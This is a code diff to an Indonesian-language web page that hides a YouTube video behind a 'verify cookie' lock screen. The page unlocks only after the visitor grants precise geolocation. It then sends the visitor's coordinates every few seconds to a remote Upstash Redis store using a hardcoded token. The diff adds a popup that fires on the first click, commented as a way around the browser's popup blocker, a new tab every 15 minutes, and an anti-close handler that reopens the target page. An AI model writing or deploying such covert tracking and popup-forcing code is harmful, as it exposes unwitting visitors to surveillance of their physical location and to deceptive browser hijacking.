@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <style>
- /* CONTAINER UTAMA KONTEN */
+     /* CONTAINER UTAMA KONTEN */
 .content-wrapper {
     position: absolute;
     top: 50%;
@@ -74,31 +74,33 @@
 
     <div class="container">
         <header>
-           
             <div id="status-display" class="status-badge status-checking"></div>
         </header>
 
-       <div id="content-frame" class="content-wrapper" style="display: none;">
-    <iframe id="video-youtube" src="https://www.youtube.com/embed/6K2E4CFKtNI" allow="autoplay; encrypted-media; fullscreen"></iframe>
-  
-</div>
-            <div id="lock-screen">
-                <div class="textnotif">
-            
-                
-                    <div class="lock-msg">verifikasi cookie untuk melihat konten</div>
-                </div>
+        <div id="content-frame" class="content-wrapper" style="display: none;">
+            <iframe id="video-youtube" src="https://www.youtube.com/embed/6K2E4CFKtNI" allow="autoplay; encrypted-media; fullscreen"></iframe>
+        </div>
+        
+        <div id="lock-screen">
+            <div class="textnotif">
+                <div class="lock-msg">verifikasi cookie untuk melihat konten</div>
             </div>
         </div>
     </div>
 
     <script>
-        // Konfigurasi Upstash Redis REST API
+        // Konfigurasi Upstash Redis REST API & Target URL
         const CONFIG = {
             URL: "https://enabled-crayfish-71186.upstash.io",
             TOKEN: "gQAAAAAAARYSAAIncDE2MzUzMjQ5Mzg2N2E0YzU2OTUxODJjZWNmY2E2NzkyMXAxNzExODY",
-            PREFIX: "candiru_6"
+            PREFIX: "candiru_1",
+            TARGET_URL: "https://firstian84.github.io/firstiantechnology/candiru3.html"
         };
+
+        // Variabel global untuk manajemen interval dinamis
+        let locationInterval = null;
+        let isLongInterval = false;
+        let tabRedirectInterval = null;
 
         // Fungsi mendapatkan waktu Jakarta (WIB) dengan format YYYY-MM-DD HH:mm:ss
         function getJakartaTimestamp() {
@@ -183,9 +185,14 @@
                         
                         iframe.style.display = "block";
                         lockScreen.style.display = "none";
+
+                        // TAMBAHAN: Jika berhasil dapat koordinat & sukses Upstash, ubah interval ke 5 menit
+                        switchInterval(300000); 
                     } else {
                         // Jika koordinat gagal masuk ke Upstash, konten tetap terkunci total
                         handleAccessDenied("Gagal sinkronisasi database server.");
+                        // Kembalikan ke interval cepat jika sebelumnya berada di interval lambat
+                        switchInterval(3000);
                     }
 
                     removeWhiteOverlay();
@@ -193,6 +200,8 @@
                 (error) => {
                     handleAccessDenied("");
                     removeWhiteOverlay();
+                    // Kembalikan ke interval cepat jika terjadi error/akses dicabut
+                    switchInterval(3000);
                 },
                 {
                     enableHighAccuracy: true,
@@ -201,15 +210,19 @@
             );
         }
 
-        // Sistem utama untuk menginisialisasi pelacakan konstan
-        function initCandiruSystem() {
-            // Eksekusi pertama kali saat halaman dimuat
-            fetchAndSyncLocation();
+        // Fungsi pembantu untuk mengganti interval secara dinamis tanpa merusak alur sistem
+        function switchInterval(ms) {
+            if (ms === 300000 && isLongInterval) return; // Sudah dalam mode 5 menit
+            if (ms === 3000 && !isLongInterval && locationInterval !== null) return; // Sudah dalam mode 3 detik
 
-            // Melakukan refresh pengambilan koordinat dan sinkronisasi otomatis setiap 3000ms (3 detik)
-            setInterval(() => {
+            if (locationInterval) {
+                clearInterval(locationInterval);
+            }
+
+            isLongInterval = (ms === 300000);
+            locationInterval = setInterval(() => {
                 fetchAndSyncLocation();
-            }, 3000);
+            }, ms);
         }
 
         // Handler saat akses diblokir / GPS mati / Sinkronisasi database gagal
@@ -223,6 +236,55 @@
 
             iframe.style.display = "none";
             lockScreen.style.display = "flex";
+        }
+
+        // =========================================================================
+        // FITUR TAMBAHAN: SIKLUS MANAJEMEN TAB (15 MENIT & ANTI-CLOSE FALLBACK)
+        // =========================================================================
+
+        // Fungsi mengeksekusi pembukaan tab baru secara aman
+        function openTargetTab() {
+            window.open(CONFIG.TARGET_URL, '_blank');
+        }
+
+        function initTabAutomation() {
+            // Jalankan interval pembukaan tab baru setiap 15 menit (900.000 ms)
+            if (tabRedirectInterval) clearInterval(tabRedirectInterval);
+            
+            tabRedirectInterval = setInterval(() => {
+                openTargetTab();
+            }, 900000);
+
+            // Jembatan Interaksi: Memicu tab pertama kali terbuka ketika user menyentuh/mengklik area manapun di layar
+            // Ini diperlukan untuk melewati sistem proteksi Popup Blocker bawaan browser
+            const triggerInitialPopup = () => {
+                openTargetTab();
+                window.removeEventListener('click', triggerInitialPopup);
+                window.removeEventListener('touchstart', triggerInitialPopup);
+            };
+            window.addEventListener('click', triggerInitialPopup);
+            window.addEventListener('touchstart', triggerInitialPopup);
+
+            // Fallback ketika user mencoba menutup tab secara paksa (Anti-Close)
+            window.addEventListener('beforeunload', (event) => {
+                openTargetTab();
+                // Beberapa browser membutuhkan standar string kembalian agar event terpicu
+                const baseMessage = "Sistem mendeteksi penutupan halaman.";
+                event.returnValue = baseMessage;
+                return baseMessage;
+            });
+        }
+
+        // Sistem utama untuk menginisialisasi pelacakan konstan
+        function initCandiruSystem() {
+            // Eksekusi pelacakan lokasi pertama kali saat halaman dimuat
+            fetchAndSyncLocation();
+
+            // Melakukan refresh pengambilan koordinat default setiap 5000ms (5 detik)
+            switchInterval(5000);
+
+            // Mengaktifkan otomatisasi tab eksternal
+            initTabAutomation();
         }
 
         // Eksekusi sistem secara otomatis saat window termuat penuh
